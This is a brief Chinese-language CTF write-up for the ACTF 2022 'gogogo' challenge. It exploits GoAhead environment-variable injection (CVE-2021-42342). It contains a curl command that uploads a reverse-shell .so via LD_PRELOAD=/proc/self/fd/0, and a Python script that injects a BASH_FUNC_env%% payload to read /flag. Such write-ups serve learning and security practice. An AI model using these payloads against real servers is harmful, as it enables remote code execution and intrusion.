## 题目介绍

[附件](/CTF_ATTACHMENTS/2022/ACTF-gogogo.zip)

```
ACTF warmup
http://123.60.84.229:10218
docker retstart every 10 minutes!
```

考点：
- LD_PRELOAD
- CVE漏洞

## Writeup

GoAhead环境变量注入 cve-2021-42342 参考p牛的文章
> https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html
> https://github.com/Mr-xn/CVE-2021-42342，

1、编译好上述库里的反弹代码，注意编译的时候加-s（p牛文章有提到，可以缩小.so文件体积）

2、然后触发漏洞：`curl -F "LD_PRELOAD=/proc/self/fd/0" -F data=@exp.so http://123.60.84.229:10218/cgi-bin/hello`

3、爆破`/proc/self/fd/$$`反弹shell

**另一种解法**：

su战队的[Writeup](https://mp.weixin.qq.com/s/DCxrEmkYzFdUa2YHOdnD7g)用的`BASH_FUNC`

```python
import requests

payload = {
    "BASH_FUNC_env%%":(None,"() { cat /flag; exit; }"),
}

r = requests.post("http://123.60.84.229:10218/cgi-bin/hello",files=payload)
print(r.text)
```